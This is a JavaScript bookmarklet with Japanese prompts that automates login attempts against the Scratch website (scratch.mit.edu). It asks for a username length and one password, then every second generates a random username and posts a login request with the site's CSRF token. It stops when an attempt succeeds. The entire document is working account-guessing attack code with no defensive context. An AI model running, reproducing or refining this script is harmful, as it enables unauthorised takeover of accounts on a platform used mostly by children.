javascript:(function(){try{function g(n){var m=document.cookie.match(new RegExp("(?:^|; )"+n+"=([^;]*)"));return m?decodeURIComponent(m[1]):null}function r(l){var c="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-",s="";for(var i=0;i<l;i++)s+=c.charAt(Math.floor(Math.random()*c.length));return s}async function login(u,p){try{const res=await fetch("https://scratch.mit.edu/accounts/login/",{method:"POST",credentials:"include",headers:{"x-csrftoken":g("scratchcsrftoken")||"a","x-requested-with":"XMLHttpRequest","content-type":"application/json","accept":"application/json"},body:JSON.stringify({username:u,password:p,useMessages:true})});const t=await res.text();console.log("ユーザー:",u,"ステータス:",res.status);if(res.status===200){alert("✅ 成功! ユーザー名: "+u+"\n\nレスポンス:\n"+t);return true}return false}catch(e){console.error("fetchエラー:",e);return false}}(async function(){var lenStr=prompt("生成するユーザー名の文字数を入力してください（例:8）","8");if(!lenStr)return alert("キャンセル");var len=parseInt(lenStr,10);if(isNaN(len)||len<=0)return alert("無効な数値");var pass=prompt("パスワードを入力してください");if(pass===null)return alert("キャンセル");if(pass.length===0)return alert("パスワードが空です");alert("1秒ごとに試行を開始します。");var timer=setInterval(async()=>{var user=r(len);var ok=await login(user,pass);if(ok){clearInterval(timer);alert("💡 成功したためループを停止しました。");}},1000);})();}catch(e){alert("実行エラー: "+e.message);}})();
